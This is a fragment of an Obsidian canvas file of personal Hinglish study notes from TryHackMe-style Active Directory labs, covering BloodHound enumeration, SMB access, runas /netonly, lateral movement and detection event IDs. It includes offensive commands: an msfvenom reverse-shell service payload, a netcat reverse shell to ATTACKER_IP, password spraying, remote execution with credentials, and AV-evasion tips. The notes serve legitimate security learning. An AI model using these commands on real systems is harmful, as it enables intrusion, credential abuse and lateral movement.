		{"id":"3b28e9759ee38820","type":"text","text":"## BLOODHOUND","x":-3470,"y":2711,"width":250,"height":60},
		{"id":"6057b54a609e1c44","type":"text","text":"## Command Prompt","x":-4319,"y":2721,"width":309,"height":50},
		{"id":"9e5295af30c6b7a4","type":"text","text":"## PORT SCANING","x":-4308,"y":2606,"width":298,"height":50},
		{"id":"b8edada715bef08f","type":"text","text":"# [[AD Enumeration - Bloodhound & Sharphound]]\n\n## 📌 Simplified Overview\n- **Concept:** Defenders think in lists, Attackers think in graphs.\n- **Bloodhound:** Powerful GUI tool jo Active Directory ko map karke attack paths (shortcuts to Domain Admin) dikhata hai. \n- **Neo4j:** Bloodhound ka backend graph database system hai.\n\n## 🎯 Sharphound vs Bloodhound\n- **Sharphound (Data Collector):** Target environment mein chalate hain AD data enumerate karne ke liye. (Output: `.zip` file).\n- **Bloodhound (Visualizer):** Attacker machine par `.zip` import karke graphs dekhte hain.\n\n## ⚠️ Important Considerations\n- Sharphound versions and Bloodhound versions **must match** (e.g., v4.1.0).\n- Sharphound noisy hota hai aur AV se pakda jaa sakta hai. \n- **Evasion:** Run on a non-domain machine (AV disabled) using `runas` and point to DC using `--ExcludeDCs`.\n\n## 🛠️ Execution & Commands\n\n**1. Data Collection (Sharphound on Target)**\n`SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs`\n- Pehli baar `--CollectionMethods All` use karein.\n- Baad mein sessions capture karne ke liye sirf `--CollectionMethods Session` use karein (Fast & Stealthy). Best time: 10:00 AM & 14:00 PM.\n\n**2. Setup Database & GUI (Attacker Machine)**\n`neo4j console start` (Default creds: neo4j:neo4j)\n`bloodhound --no-sandbox`\n\n**3. Data Exfiltration**\n`scp <User>@THMJMP1.za.tryhackme.com:C:/Users/<User>/Documents/<ZIP_FILE> .`\n- Download karke Bloodhound GUI mein drag and drop karein.\n\n## ⚔️ Identifying Attack Paths\n- Bloodhound GUI mein **Nodes** (icons) aur **Edges** (lines/permissions) hote hain.\n- **Analysis Queries:** Pre-built queries (e.g., \"Find all Domain Admins\").\n- **Custom Path:** Start Node (Current User) se End Node (Target Group/User) tak ka path set karke exploitation route dhoondein (e.g., RDP -> Local Admin -> Mimikatz -> Pass The Hash).","x":-3560,"y":3981,"width":996,"height":1232},
		{"id":"b19254015be276a7","type":"text","text":"# SMB Enumeration & Share Access\n\n## SMB Share Access\n- **smbmap** → SMB shares + permissions enumerate karo.\n- `READ` permission → share ke files read/download kar sakte ho.\n- Anonymous access → credentials ke bina share access try karo.\n- `smbclient` → SMB share connect/interact karne ke liye.\n\n## Commands\n\n# Anonymous access\nsmbclient //TARGET_IP/SHARE_NAME -N\n\n# Inside SMB\nls\nget <filename>\nexit\n\n# Authenticated access\nsmbclient //TARGET_IP/SHARE_NAME -U 'username%password'\n\n# Domain account\nsmbclient //TARGET_IP/SHARE_NAME -U 'username%password' -W DOMAIN\n\n## Enumeration Flow\nNmap\n  ↓\nFind SMB (445)\n  ↓\nsmbmap\n  ↓\nShares + Permissions\n  ↓\nREAD / Anonymous Share\n  ↓\nsmbclient\n  ↓\nls → Find interesting files\n  ↓\nget → Download\n  ↓\nAnalyze → Credentials / Secrets / Useful Info\n\n## Important AD Ports\n- `88` → Kerberos → Kerberoasting / Pass-the-Ticket\n- `135` → RPC → DCOM / lateral movement\n- `139` → NetBIOS → Legacy SMB / null sessions\n- `389` → LDAP → AD enumeration\n- `445` → SMB → Shares / Relay / Exploits / Credential attacks\n- `636` → LDAPS → Secure LDAP / AD enumeration\n\n## Nmap\nnmap -p 88,135,139,389,445,636 -sV -sC TARGET_IP\n\n- `-p` → specific ports\n- `-sV` → service/version detection\n- `-sC` → default NSE scripts\n\n## CRUX\n- **445 = SMB → always investigate.**\n- `smbmap` = **enumerate shares/permissions**\n- `smbclient` = **access/interact with shares**\n- `-N` = **anonymous/no password**\n- `READ` = **download & inspect files**\n- Interesting SMB files may reveal **credentials, configs, secrets or AD information**.\n- Methodology: **Discover → Enumerate → Access → Download → Analyze**","x":-1920,"y":2010,"width":763,"height":2161},
		{"id":"19072b9be39879d6","type":"text","text":"`runas /netonly` basically Windows ko bolta hai:\n\n> **“Local machine par mujhe Bob hi rehne do, but network resources ko access karte waqt John ke credentials try karo.”**\n\n# Runas /netonly — Credential Injection\n\n## Core\n- AD credentials mil gaye but machine **domain-joined nahi hai** → `runas /netonly`\n- New CMD open hota hai, but **local user change nahi hota**.\n- Supplied AD credentials **sirf network authentication** ke liye use hote hain.\n\n## Command\nrunas.exe /netonly /user:<DOMAIN>\\<USERNAME> cmd.exe\n\n## Flow\nAD Credentials\n    ↓\nrunas /netonly\n    ↓\nNew CMD\n    ↓\nNetwork Resource/App\n    ↓\nAuthenticate using AD User's Credentials\n    ↓\nAccess based on AD User's permissions\n\n## Important\n- `runas /netonly` ≠ login as that AD user.\n- **Local identity = your current user**\n- **Network identity = supplied AD user**\n- `runas` successful ≠ credentials verified.\n- `/netonly` credentials ko immediately DC ke against verify nahi karta.\n- Local Administrator ≠ Domain Administrator.\n\n## CRUX\n> `/netonly` = **Local mein main, Network mein AD user.**\n\nAD creds → Runas → CMD → Network Authentication → AD Resource","x":-1920,"y":4524,"width":763,"height":1378},
		{"id":"3d301030b00df64a","type":"text","text":"# Lateral Movement: Remote Process Creation\n\n## 1. PsExec\n*   **Protocol/Ports:** SMB (445/TCP)\n*   **Requirement:** Local Administrator privileges.\n*   **Mechanism:** Uploads a service binary to `Admin$` share, creates a service via Service Control Manager, and handles stdin/stdout through named pipes.\n*   **Command:** \n    ```cmd\n    psexec64.exe \\\\<TARGET_IP> -u <Username> -p <Password> -i cmd.exe\n    ```\n\n## 2. WinRM (Windows Remote Management)\n*   **Protocol/Ports:** HTTP (5985/TCP) or HTTPS (5986/TCP)\n*   **Requirement:** Member of `Remote Management Users`.\n*   **Mechanism:** Web-based protocol sending PowerShell commands. Enabled by default on most Windows Servers.\n*   **Command (CMD):**\n    ```cmd\n    winrs.exe -u:<Username> -p:<Password> -r:<TARGET_IP> cmd\n    ```\n\n## 3. Remote Services (sc.exe)\n*   **Protocol/Ports:** DCE/RPC (135, Dynamic 49152-65535) or SMB/Named Pipes (139, 445)\n*   **Requirement:** Administrator privileges.\n*   **Mechanism:** Connects to Service Control Manager (SVCCTL). Creates a service that executes a specified binary when started. **Blind execution** (no output returned).\n*   **Key Concept:** Custom executables will crash. Reverse shells MUST be compiled as a service executable.\n    ```bash\n    msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=<IP> LPORT=<PORT> -o myservice.exe\n    ```\n*   **Commands:**\n    ```cmd\n    sc.exe \\\\<TARGET_IP> create <ServiceName> binPath= \"<Path_to_exe>\" start= auto\n    sc.exe \\\\<TARGET_IP> start <ServiceName>\n    ```\n\n## 4. Scheduled Tasks (schtasks)\n*   **Mechanism:** Creates a one-time scheduled task to execute a payload. Runs as `SYSTEM`. **Blind execution**.\n*   **Commands:**\n    ```cmd\n    schtasks /s <TARGET_IP> /RU \"SYSTEM\" /create /tn \"<TaskName>\" /tr \"<Payload_Command>\" /sc ONCE /sd 01/01/1970 /st 00:00\n    schtasks /s <TARGET_IP> /run /TN \"<TaskName>\"\n    ```\n\n## 🛠️ The `runas /netonly` Token Impersonation Trick\nWhen tools (like `sc.exe`) do not accept credentials directly via CLI flags, you can spawn a new process using the target credentials' access token.\n*   **Command:**\n    ```cmd\n    runas /netonly /user:<DOMAIN>\\<Username> \"c:\\tools\\nc64.exe -e cmd.exe <ATTACKER_IP> <PORT>\"\n    ```\n*   **Note:** The `/netonly` flag does not validate the password locally; it only applies when authenticating across the network. If the password is wrong, you will get \"Access Denied\" only during execution.","x":-8014,"y":-2388,"width":940,"height":1598},
		{"id":"cf9ff9953787311f","type":"text","text":"#### 1. PsExec (Impacket's `psexec.py`)\n\n- **Kaise Kaam Karta Hai:**\n    \n    1. Port 445 (SMB) se connect karke `ADMIN$` share par ek randomized `.exe` file upload karta hai.\n        \n    2. Service Control Manager (SCM) ke zariye ek nayi Windows Service banata hai (`Event ID 7045`).\n        \n    3. Us service ko run karta hai jisse hume **`NT AUTHORITY\\SYSTEM`** shell mil jata hai (kyunki Windows services `SYSTEM` privileges se chalti hain).\n        \n    4. Exit hone par service aur uploaded binary delete kar deta hai.\n        \n- **Kyun Noisy Hai:** Disk par file write hoti hai, naye services banne ke event logs generate hote hain, isliye Anti-Virus aur SOC Analysts ise aaram se pakad lete hain.\n    \n- **Prerequisite Check:** Pehle `nxc smb <IP> -u user -p pass` chala kar check karo. Agar output mein **`(Pwn3d!)`** likha aaye, tabhi PsExec kaam karega\n\n\n### Why SYSTEM Shell?\n\n| Feature                         | Explanation                                                             |\n| ------------------------------- | ----------------------------------------------------------------------- |\n| **Service runs as LocalSystem** | Windows service by default **SYSTEM** privileges se run hoti hai        |\n| **SYSTEM = Root**               | NT AUTHORITY\\SYSTEM = highest privilege (Linux root jaisa)              |\n| **Why Not jdoe?**               | Service binary jdoe ke context mein nahi chalti, SYSTEM mein chalti hai |\n\n**Tip:** If PsExec hangs or fails to connect, the most common causes are: the `ADMIN$` share isn't accessible (firewall blocking port 445), the account doesn't have local admin rights on the target (you won't see `(Pwn3d!)` in NetExec), or SMB signing is enforced. Always pre-check access with NetExec first.","x":-7984,"y":-600,"width":739,"height":841},
		{"id":"6a951338b63ae2c1","type":"text","text":"## psExec","x":-6917,"y":181,"width":250,"height":60},
		{"id":"209a1539347599cb","type":"text","text":"#### PsExec se `SYSTEM` shell kyun milta hai, `jdoe` ka kyun nahi?\n\nJab tu command chalata hai: `psexec.py thm.loc/jdoe:'Summer2026!'@192.168.13.61`:\n\n1. Tu authentication `jdoe` ke password se karta hai.\n    \n2. Lekin PsExec target machine par ek **Windows Service** (`psexesvc.exe`) create karke start karta hai.\n    \n3. **Windows ka rule hai:** By default, jab bhi koi nayi Background Service start hoti hai, Windows usko **`NT AUTHORITY\\SYSTEM`** account ke under execute karta hai.\n    \n4. Kyunki wo service `SYSTEM` ke under chal rahi hai, aur wo service tujhe command prompt (`cmd.exe`) deti hai, toh tera shell bhi automatically **`SYSTEM`** account ka ban jata hai!\n    \n\n> **Analogy:** `jdoe` ne sirf darwaze ki chaabi lagayi, lekin andar jo robot (Service) execute hua, wo OS ka apna personal God-level robot (`SYSTEM`) tha. Isliye tujhe `jdoe` ke bajaye God-level access mil gaya.","x":-8014,"y":320,"width":769,"height":428},
		{"id":"49c2f4dc33c428ce","type":"text","text":"# Remote Process Creation","x":-5983,"y":599,"width":346,"height":70},
		{"id":"daaf282cc979198b","type":"text","text":"# NXC","x":-7074,"y":1130,"width":250,"height":60},
		{"id":"1c8b9582c014d848","type":"text","text":"### L -> APNA PORT SAMNE WALE COMPUTER PE DIKHANA HAI \n\n### R-> SAMNE WLA KA PORT SUNA HAI MUJHE JO BHI SAMNE WALE KE PORT PE HOGA MUJHE APNE PORT PDE DEKHNA HAI\n**`-L` = Local machine par port khulta hai.**  \n**`-R` = Remote machine par port khulta hai.**","x":-6080,"y":1534,"width":683,"height":186},
		{"id":"b9bc2f1ed5f17ccd","type":"text","text":"# 🟡 First use: Access Check\n\nEarlier humne kiya:\n\n```\nnxc smb TARGET -u jdoe -p 'PASSWORD' -d DOMAIN\n```\n\nIska purpose:\n\n```\nCredentials valid?\n       ↓\nSMB accessible?\n       ↓\nAdmin access?\n```\n\nAur output:\n\n```\n(Pwn3d!)\n```\n\nlab context mein indicate karta hai ki account ke paas target par administrative access hai.\n\nSo yes:\n\n```\nnxc\n ↓\nEnumeration / authentication check\n```\n\n**But that's only one capability.**\n\n---\n\n# 🔴 Second use: Remote Command Execution\n\nAb:\n\n```\nnxc smb TARGET \\\n-u USER \\\n-p 'PASSWORD' \\\n-d DOMAIN \\\n-x 'whoami /all'\n```\n\nYahan `-x` important hai.\n\n```\n-x\n ↓\nExecute command via cmd.exe\n```\n\nSo:\n\n```\nnxc\n ↓\nSMB\n ↓\nAuthenticate\n ↓\nExecute command\n ↓\nReturn output\n```\n\nTHM explicitly shows `-x` for CMD command execution.\n\n---\n\n# 🟣 `-X` kya karta hai?\n\n```\nnxc smb TARGET \\\n-u USER \\\n-p 'PASSWORD' \\\n-d DOMAIN \\\n-X '$PSVersionTable'\n```\n\nCapital:\n\n```\n-X\n```\n\nmeans:\n\n> **PowerShell command execute karo.**\n\nWhereas:\n\n```\n-x\n```\n\nmeans:\n\n> **CMD command execute karo.**\n\nTHM's example uses exactly this distinction.\n\n---\n\n# 🧠 `-x` vs `-X`\n\nYe **pakka yaad kar lena**:\n\n```\n-x  → cmd.exe\n-X  → PowerShell\n```\n\nExample:\n\n```\nnxc smb TARGET -u USER -p 'PASS' -x 'whoami'\n```\n\nvs.\n\n```\nnxc smb TARGET -u USER -p 'PASS' -X 'Get-Process'\n```","x":-7629,"y":1640,"width":594,"height":2850},
		{"id":"da2143537ebb861f","type":"text","text":"### NetExec Kya Karta Hai?\n\n|Feature|Kaam|Example|\n|---|---|---|\n|**Password Spray**|Multiple users pe ek password try karo|`nxc smb /24 -u users.txt -p 'Password123'`|\n|**Check Admin Access**|Pwn3d! marker se pata chalta hai admin hai ya nahi|`nxc smb IP -u user -p pass` → `(Pwn3d!)`|\n|**Command Execution**|Remote command run karo (SMB/WinRM/RDP)|`nxc smb IP -u user -p pass -x 'whoami'`|\n|**Share Enumeration**|SMB shares list karo|`nxc smb IP -u user -p pass --shares`|\n|**LDAP Enumeration**|AD users/groups dump karo|`nxc ldap DC -u user -p pass --users`|","x":-6949,"y":1640,"width":560,"height":600},
		{"id":"3062ce747c5044bf","type":"text","text":"# PASS THE HASH","x":-5777,"y":1000,"width":250,"height":60},
		{"id":"e348cb4549e0bb22","type":"text","text":"[[BASIC THEORY]]","x":-5777,"y":1149,"width":250,"height":60},
		{"id":"597e3ddd267fc1f0","type":"text","text":"[[LATERAL MOVMENT AND PIVOTING]]","x":-5120,"y":-1186,"width":320,"height":50},
		{"id":"8fa5aa3a9beb805e","type":"text","text":"# Remote Execution\n\n## Core Idea\n\nRemote Execution = remotely executing commands/processes\non another Windows host using legitimate Windows mechanisms.\n\nMost methods require:\n- Valid credentials\n- Local Administrator privileges on target\n\nException:\n- WinRM also allows Remote Management Users.\n\n---\n\n# PsExec\n\n## What?\n\nPsExec uses SMB + Windows Services to execute commands remotely.\n\nProtocol:\n- SMB\n- Port 445\n\nRequirements:\n- Local Administrator\n- ADMIN$ access\n\n## Flow\n\nAttacker\n→ SMB 445\n→ IPC$\n→ ADMIN$\n→ Upload service binary\n→ Service Control Manager\n→ Create service\n→ Start service\n→ SYSTEM shell\n\n## Important\n\nPsExec service runs as:\n\nNT AUTHORITY\\SYSTEM\n\nTherefore:\n\nwhoami\n→ nt authority\\system\n\n## Why Noisy?\n\n- Writes executable to disk\n- Creates Windows service\n- Event ID 7045\n- Multiple forensic artifacts\n\n## Verify Access First\n\nnxc smb TARGET -u USER -p PASSWORD -d DOMAIN\n\n(Pwn3d!) → local admin access confirmed\nin this lab context.\n\n---\n\n# Evil-WinRM\n\n## What?\n\nTool for interacting with Windows Remote Management.\n\nPorts:\n- 5985 HTTP\n- 5986 HTTPS\n\n## Requirements\n\nEither:\n- Local Administrators\nOR\n- Remote Management Users\n\n## Flow\n\nCredentials\n→ WinRM\n→ PowerShell session\n→ Authenticated user context\n\n## Important Difference\n\nPsExec:\n→ SYSTEM\n\nEvil-WinRM:\n→ Authenticated user\n\nTherefore Evil-WinRM does NOT automatically give SYSTEM.\n\n---\n\n# PsExec vs Evil-WinRM\n\nPsExec:\n- SMB\n- 445\n- Local Admin\n- Service creation\n- SYSTEM\n- Noisier\n\nEvil-WinRM:\n- WinRM\n- 5985/5986\n- Admin OR Remote Management Users\n- PowerShell\n- Authenticated user\n- Relatively quieter\n\n---\n\n# Other Methods\n\nWMI\n→ wmiexec.py\n→ WMI/DCOM process creation\n\nDCOM\n→ dcomexec.py\n→ DCOM/COM execution\n\nSMBExec\n→ smbexec.py\n→ Service + cmd.exe\n\nAtExec\n→ atexec.py\n→ Task Scheduler RPC\n\nRDP\n→ port 3389\n→ Full GUI session\n\nNetExec\n→ quick command execution\n→ -x = cmd\n→ -X = PowerShell\n\n---\n\n# Detection\n\n4624 Type 3\n→ Network logon\n\n4648\n→ Explicit credentials\n\n7045\n→ New service installed\n→ Important for PsExec/SMBExec\n\n4697\n→ Service installed\n\n4698\n→ Scheduled task created\n\n4688\n→ Process creation\n\nPsExec:\n7045 + suspicious/random service name\n→ strong indicator\n\n---\n\n# Mental Model\n\nCredentials\n    ↓\nRemote Execution\n    ↓\nNew Host\n    ↓\nHigher Privileges / Credential Discovery\n    ↓\nHarvest Hash/Ticket\n    ↓\nCredential Reuse\n    ↓\nNext Host","x":-6410,"y":-5882,"width":600,"height":5200}
	],
